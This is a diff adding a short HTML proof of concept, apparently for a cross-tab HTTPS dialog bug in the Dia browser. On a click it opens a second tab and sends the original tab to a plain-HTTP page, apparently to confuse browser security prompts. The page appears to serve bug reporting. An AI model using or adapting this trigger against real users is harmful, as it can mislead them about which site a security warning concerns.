@@ -1,0 +1,51 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Dia Cross-Tab HTTPS Dialog PoC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #151923;
+      color: white;
+      display: grid;
+      place-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    button {
+      padding: 18px 35px;
+      font-size: 20px;
+      cursor: pointer;
+      border: 0;
+      border-radius: 10px;
+      background: #3478f6;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <button id="test">Start Test</button>
+
+  <script>
+    const httpTarget =
+      "http://relaxedbeautifullushsecret.neverssl.com/online";
+
+    document.getElementById("test").addEventListener("click", () => {
+      // Open the second tab during the user click.
+      const secondTab = window.open(
+        "https://example.com/",
+        "_blank"
+      );
+
+      // Navigate the original tab to HTTP.
+      window.location.assign(httpTarget);
+
+      if (!secondTab) {
+        console.log("Popup was blocked");
+      }
+    });
+  </script>
+</body>
+</html>
